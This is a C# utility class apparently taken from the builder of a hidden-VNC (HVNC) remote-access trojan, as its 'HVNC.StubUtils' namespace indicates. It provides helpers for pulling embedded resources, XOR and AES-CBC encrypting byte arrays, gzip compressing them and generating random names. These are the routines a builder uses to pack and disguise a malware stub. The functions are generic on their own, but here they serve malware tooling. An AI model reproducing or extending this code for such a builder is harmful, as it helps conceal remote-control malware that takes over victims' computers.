using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;

namespace BirdBrainmofo.HVNC.StubUtils
{
    public class Utils
    {
        public static byte[] GetEmbeddedResource(string name)
        {
            Assembly executingAssembly = Assembly.GetExecutingAssembly();
            MemoryStream memoryStream = new MemoryStream();
            Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(name);
            manifestResourceStream.CopyTo(memoryStream);
            manifestResourceStream.Dispose();
            byte[] result = memoryStream.ToArray();
            memoryStream.Dispose();
            return result;
        }

        public static string GetEmbeddedString(string name)
        {
            StreamReader streamReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream(name));
            string result = streamReader.ReadToEnd();
            streamReader.Close();
            streamReader.Dispose();
            return result;
        }

        public static byte[] Encrypt(EncryptionMode type, byte[] input, byte[] key, byte[] byte_0)
        {
            switch (type)
            {
                default:
                    return null;
                case EncryptionMode.XOR:
                    {
                        for (int i = 0; i < input.Length; i++)
                        {
                            input[i] = (byte)(input[i] ^ key[i % key.Length]);
                        }
                        return input;
                    }
                case EncryptionMode.AES:
                    {
                        AesManaged obj = new AesManaged
                        {
                            Mode = CipherMode.CBC,
                            Padding = PaddingMode.PKCS7
                        };
                        ICryptoTransform cryptoTransform = obj.CreateEncryptor(key, byte_0);
                        byte[] result = cryptoTransform.TransformFinalBlock(input, 0, input.Length);
                        cryptoTransform.Dispose();
                        obj.Dispose();
                        return result;
                    }
            }
        }

        public static byte[] Compress(byte[] bytes)
        {
            MemoryStream memoryStream = new MemoryStream(bytes);
            MemoryStream memoryStream2 = new MemoryStream();
            GZipStream gZipStream = new GZipStream(memoryStream2, CompressionMode.Compress);
            memoryStream.CopyTo(gZipStream);
            gZipStream.Dispose();
            memoryStream2.Dispose();
            memoryStream.Dispose();
            return memoryStream2.ToArray();
        }

        public static string RandomString(int length, Random rng)
        {
            return new string((from string_0 in Enumerable.Repeat("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", length)
                               select string_0[rng.Next(string_0.Length)]).ToArray());
        }

        public static bool IsAssembly(string path)
        {
            try
            {
                AssemblyName.GetAssemblyName(path);
                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
